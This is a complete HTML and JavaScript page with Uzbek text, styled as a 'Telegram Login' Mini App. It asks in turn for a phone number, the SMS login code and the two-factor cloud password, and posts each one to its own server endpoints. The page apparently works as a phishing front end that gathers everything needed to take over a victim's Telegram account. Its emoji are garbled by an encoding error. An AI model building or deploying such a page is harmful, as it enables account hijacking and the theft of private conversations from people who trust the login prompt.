<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8" />
  <title>Telegram Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <script src="https://telegram.org/js/telegram-web-app.js"></script>

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f6f7fb;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 400px;
      margin: 40px auto;
      background: white;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #4f46e5;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

    button:disabled {
      background: #999;
    }

    .message {
      margin-top: 12px;
      text-align: center;
      font-size: 14px;
    }

    .hidden {
      display: none;
    }

    .success { color: green; }
    .error { color: red; }
    .info { color: #555; }
  </style>
</head>
<body>

<div class="container">
  <h2>üîê Telegram login</h2>

  <!-- TELEFON -->
  <div id="step-phone">
    <input id="phone" placeholder="+998901234567" />
    <button onclick="sendCode()">üì® Kod yuborish</button>
  </div>

  <!-- SMS KOD -->
  <div id="step-code" class="hidden">
    <input id="code" placeholder="SMS kod" />
    <button onclick="verifyCode()">‚úÖ Tasdiqlash</button>
  </div>

  <!-- 2FA -->
  <div id="step-password" class="hidden">
    <input id="password" type="password" placeholder="Telegram parol (2FA)" />
    <button onclick="verifyPassword()">üîì Kirish</button>
  </div>

  <div id="message" class="message info"></div>
</div>

<script>
const tg = window.Telegram.WebApp;

function showMessage(text, type="info") {
  const el = document.getElementById("message");
  el.innerText = text;
  el.className = "message " + type;
}

function sendCode() {
  const phone = document.getElementById("phone").value.trim();
  if (!phone.startsWith("+")) {
    showMessage("‚ùå Telefon raqam + bilan boshlanishi kerak", "error");
    return;
  }

  showMessage("üì® Kod yuborilmoqda, biroz kuting...", "info");

  fetch("/send_code", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ phone })
  })
  .then(r => r.json())
  .then(data => {
    if (data.status === "ok") {
      document.getElementById("step-phone").classList.add("hidden");
      document.getElementById("step-code").classList.remove("hidden");
      showMessage("üì© SMS kod yuborildi", "success");
    } else {
      showMessage(data.message || "‚ùå Kod yuborilmadi", "error");
    }
  })
  .catch(() => showMessage("‚ùå Server bilan aloqa yo‚Äòq", "error"));
}

function verifyCode() {
  const phone = document.getElementById("phone").value.trim();
  const code = document.getElementById("code").value.trim();

  showMessage("üîç Kod tekshirilmoqda...", "info");

  fetch("/verify_code", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ phone, code })
  })
  .then(r => r.json())
  .then(data => {
    if (data.status === "ok") {
      showMessage("‚úÖ Login muvaffaqiyatli!", "success");
      setTimeout(() => tg.close(), 1200);
    }
    else if (data.status === "2fa_required") {
      document.getElementById("step-code").classList.add("hidden");
      document.getElementById("step-password").classList.remove("hidden");
      showMessage("üîê 2 bosqichli himoya yoqilgan. Parolni kiriting.", "info");
    }
    else {
      showMessage(data.message || "‚ùå Kod noto‚Äòg‚Äòri", "error");
    }
  })
  .catch(() => showMessage("‚ùå Server xatosi", "error"));
}

function verifyPassword() {
  const phone = document.getElementById("phone").value.trim();
  const password = document.getElementById("password").value;

  showMessage("üîì Parol tekshirilmoqda...", "info");

  fetch("/verify_password", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ phone, password })
  })
  .then(r => r.json())
  .then(data => {
    if (data.status === "ok") {
      showMessage("‚úÖ Login yakunlandi!", "success");
      setTimeout(() => tg.close(), 1200);
    } else {
      showMessage(data.message || "‚ùå Parol noto‚Äòg‚Äòri", "error");
    }
  })
  .catch(() => showMessage("‚ùå Server xatosi", "error"));
}
</script>

</body>
</html>
